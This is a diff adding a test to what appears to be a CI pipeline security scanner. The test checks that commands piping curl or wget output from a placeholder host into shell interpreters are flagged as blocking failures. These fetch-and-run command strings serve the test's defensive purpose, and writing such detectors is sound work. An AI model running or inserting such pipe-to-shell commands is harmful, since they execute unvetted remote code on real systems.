@@ -173,3 +173,17 @@ test('flow-style rule preserves exact source line and never exports source bytes
  assert.equal(x[0].severity,'high');
  assert.ok(!raw.includes(secret));
 });
+
+test('pipeline audit detects curl and wget piped into six supported interpreters',()=>{
+ for(const program of ['sh','bash','zsh','dash','ksh','ash']){
+  for(const fetcher of ['curl -fsSL','wget -qO-']){
+   const command=fetcher+' https://example.test/setup | '+program;
+   const result=run(diff('.github/workflows/synthetic.yml',[command]));
+   assert.equal(result.provisionalState,'FAIL',command);
+   assert.equal(result.blockingFindings,1,command);
+   assert.equal(result.approvalAuthorized,false);
+  }
+ }
+ const safe=run(diff('src/program.mjs',['const value = 42;']));
+ assert.equal(safe.provisionalState,'INCONCLUSIVE');
+});
